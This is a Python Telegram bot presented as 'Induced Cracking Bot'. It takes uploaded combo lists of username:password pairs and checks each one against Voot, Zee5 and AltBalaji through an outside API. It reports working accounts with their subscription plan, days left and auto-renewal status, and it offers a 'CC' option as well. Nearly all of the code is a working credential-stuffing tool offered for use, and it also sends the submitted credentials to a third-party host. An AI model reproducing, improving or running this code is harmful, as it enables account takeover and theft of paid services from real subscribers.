import asyncio
import os
import requests
import telethon
import time
import shutil
import psutil
import sys
import dotenv
dotenv.load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
SUDO = list(map(int, os.getenv("SUDO").split()))

class Dict2Class(object):
    def __init__(self, my_dict):
        for key in my_dict:
            setattr(self, key, my_dict[key])


text = """---------------------------------
    ╔════╗
    ╚═╗╔═╝
    ╔═╣╠═╗
    ║╔╣╠╗║
    ║╚╣╠╝║
    ╚═╣╠═╝
    ╔═╝╚═╗ 
    ╚════╝ 
---------------------------------
"""
start_time = time.time()
client = telethon.TelegramClient(None, api_id=API_ID, api_hash=API_HASH).start(bot_token=BOT_TOKEN)

async def main():
    for x in SUDO:
        try:
            await client.send_message(x,"Bot Has been restarted")
        except:pass

loop = asyncio.get_event_loop()
loop.run_until_complete(main())  

@client.on(telethon.events.NewMessage(incoming=True, pattern='/start', func=lambda e: e.is_private))
async def _(e):

    but = [
        [
            telethon.Button.inline("Accounts", b"Acc"),
            telethon.Button.inline("Proxys", b"Proxys"),
            telethon.Button.inline("CC", b"Proxys"),
        ],
        [
            telethon.Button.url("Support", url="https://t.me/InducedBotsSupport"),
            telethon.Button.url("Dev's", url="https://t.me/InducedDevOp"),
            telethon.Button.inline("🛰 Admin Pannel", b"Admin"),
        ]
    ]
    await e.reply(f"**Welcome Sir!\n\nI'm Induced Cracking Bot \nMade for Cracking Accounts For Free\n\nMade with ❤️ By @InducedBots**", buttons=but)

@client.on(telethon.events.CallbackQuery)
async def _(e):
    if e.query.user_id not in SUDO:
        await e.client.send_message(e.chat.id, "You have no access to bot")
        return
    if e.data == b"Admin":
        but = [
            [
                telethon.Button.inline("📊 Staus", b"Stat"),
            ],
            [
                telethon.Button.inline("🔄 Restart", b"Restart"),
                telethon.Button.inline("Back", b"Home")
            ]
        ]
        await e.client.edit_message(e.chat.id, e.query.msg_id, f"**Welcome Sir!\n\nI'm Induced Scraper Bot \nMade for Adding in Free,\nWithout Any Use of Python.\n\nMade with ❤️ By @InducedBots**", buttons=but)
    elif e.data == b"Acc":
        but = [
            [
                telethon.Button.inline("Voot", "voot"),
                telethon.Button.inline("Zee5", "zee5"),
                telethon.Button.inline("AltBalaji", "alt"),
            ],
            [
                telethon.Button.inline("Back", b"Home")
            ]
        ]
        await e.client.edit_message(e.chat.id, e.query.msg_id, f"**Welcome Sir!\n\nI'm Induced Cracking Bot \nMade for Cracking Accounts For Free\n\nMade with ❤️ By @InducedBots**", buttons=but)
    elif e.data == b"Home":
        but = [
            [
                telethon.Button.inline("Accounts", b"Acc"),
                telethon.Button.inline("Proxys", b"Proxys"),
                telethon.Button.inline("CC", b"Proxys"),
            ],
            [
                telethon.Button.url("Support", url="https://t.me/InducedBotsSupport"),
                telethon.Button.url("Dev's", url="https://t.me/InducedDevOp"),
                telethon.Button.inline("🛰 Admin Pannel", b"Admin"),
            ]
        ]
        await e.client.edit_message(e.chat.id, e.query.msg_id, f"**Welcome Sir!\n\nI'm Induced Cracking Bot \nMade for Cracking Accounts For Free\n\nMade with ❤️ By @InducedBots**", buttons=but)
    elif e.data == b"Stat":
        start = time.time()
        await e.answer('\nWait Checking Stats', alert=True)
        end = round((time.time() - start) * 1000)

        def humanbytes(size):

            if size in [None, ""]:
                return "0 B"
            for unit in ["B", "KB", "MB", "GB"]:
                if size < 1024:
                    break
                size /= 1024
            return f"{size:.2f} {unit}"

        def time_formatter():
            minutes, seconds = divmod(int(time.time() - start_time), 60)
            hours, minutes = divmod(minutes, 60)
            days, hours = divmod(hours, 24)
            weeks, days = divmod(days, 7)
            tmp = (
                ((str(weeks) + "w:") if weeks else "")
                + ((str(days) + "d:") if days else "")
                + ((str(hours) + "h:") if hours else "")
                + ((str(minutes) + "m:") if minutes else "")
                + ((str(seconds) + "s") if seconds else "")
            )
            if tmp != "":
                if tmp.endswith(":"):
                    return tmp[:-1]
                else:
                    return tmp
            else:
                return "0 s"
        total, used, free = shutil.disk_usage(".")
        cpuUsage = psutil.cpu_percent()
        memory = psutil.virtual_memory().percent
        disk = psutil.disk_usage("/").percent
        upload = humanbytes(psutil.net_io_counters().bytes_sent)
        down = humanbytes(psutil.net_io_counters().bytes_recv)
        TOTAL = humanbytes(total)
        USED = humanbytes(used)
        FREE = humanbytes(free)
        tex = f"Total Details\n\nBot Usage:\n┏━━━━━━━━━━━━━━━━\n┣Ping - `{end}ms`\n┣UpTime - `{time_formatter()}`\n┗━━━━━━━━━━━━━━━━\n\nSystem Usage:\n┏━━━━━━━━━━━━━━━━\n┣UplodeSpeed: {upload}\n┣Download: {down}\n┣Cpu: {cpuUsage}%\n┣Ram: {memory}%\n┃\n┣Storage Used: {disk}%\n┃┏━━━━━━━━━━━━━━━━\n┃┣Total: {TOTAL}\n┃┣Used: {USED}\n┃┣Free: {FREE}\n┃┗━━━━━━━━━━━━━━━━\n┗━━━━━━━━━━━━━━━━\n\nMade With ❤️ By @InducedBots"
        await e.client.send_message(e.chat.id, tex, buttons=[[telethon.Button.inline("📊 Staus", b"Stat"), ]])
    elif e.data == b"Restart":
        await e.answer('\nRestarting Bot Wait', alert=True)
        os.execl(sys.executable, sys.executable, "-m", "main")
    elif e.data == b"Proxys":
        await e.answer('Comming Soon', alert=True)
    else:
        async with e.client.conversation(e.chat_id) as xmr:
            await xmr.send_message("Send Your Combo File or Text In Correct Format")
            try:
                File = await xmr.get_response(timeout=300)
            except:
                await xmr.send_message("Timeout 5min")
                return
            if File.text == "/start" or File.text == "/help":
                return
            if (File.media and File.media.document):
                timenow = time.time()
                media = await File.download_media(f'')
                with open(f"{File.file.name}", "r") as ish:
                    data = []
                    data = ish.read().split("\n")
            else:
                if ":" in File.text:
                    data = str(File.text).split("\n")
                else:
                    await xmr.send_message("Invalid way of Text Combo")
                    return

            good = 0
            custom = 0
            bad = 0
            cpm = 0
            xx = await xmr.send_message(f"Cracking Start\n\nCPM: {cpm}\nGood: {good}\nCustom: {custom}\nBad: {bad}\n\nMade with ❤️ @InducedBots")
            for t in range(len(data)):

                if t % 60 == 0:
                    await xx.edit(f"Cracking Start\n\nCPM: {cpm}\nTotal: {good+custom+bad}\nGood: {good}\nCustom: {custom}\nBad: {bad}\n\nMade with ❤️ @InducedBots")
                    cpm = 0
                elif t % 10 == 0:
                    await xx.edit(f"Cracking Start\n\nCPM: {cpm}\nTotal: {good+custom+bad}\nGood: {good}\nCustom: {custom}\nBad: {bad}\n\nMade with ❤️ @InducedBots")
                idp = data[t]
                if e.data == b"voot":
                    d = "voot"
                elif e.data == b"zee5":
                    d = "zee5"
                elif e.data == b"alt":
                    d = "alt"
                re = requests.get(
                    f"https://inducedapi.vercel.app/{d}?idp={idp}")
                ishan = Dict2Class(re.json())
                if ishan.error:
                    await xmr.send_message(f'🌟 Api Is Now Dead Contact Support Group\n@InducedBotsSupport\n\nMade with ❤️ @InducedBots')
                    return
                else:
                    if ishan.stats == 'Sucessfull':
                        if ishan.validity == "Expired":
                            custom += 1
                            await xmr.send_message(f'🌟 Hit Expired 💫\nStats: Expired\nSite: {d}\nCombo: {idp}\n\nMade with ❤️ @InducedBots')
                        else:
                            good += 1
                            await xmr.send_message(f'🌟 Hit Combo 💫\nStats: Valid\nSite: {d}\nCombo: {idp}\nPlan: {ishan.plan}\nDays Left: {ishan.validity}\nRecurring: {ishan.autorenewal}\n\nMade with ❤️ @InducedBots')
                    elif ishan.stats == "Unsucessfull":
                        bad += 1
                    cpm += 1

            await xx.edit(f"Cracking Start\n\nCPM: {cpm}\nTotal: {good+custom+bad}\nGood: {good}\nCustom: {custom}\nBad: {bad}\n\nMade with ❤️ @InducedBots")
            await xmr.send_message("All Done")


print(text)
try:
    client.run_until_disconnected()
except:
    os.execl(sys.executable, sys.executable, "-m", "main")


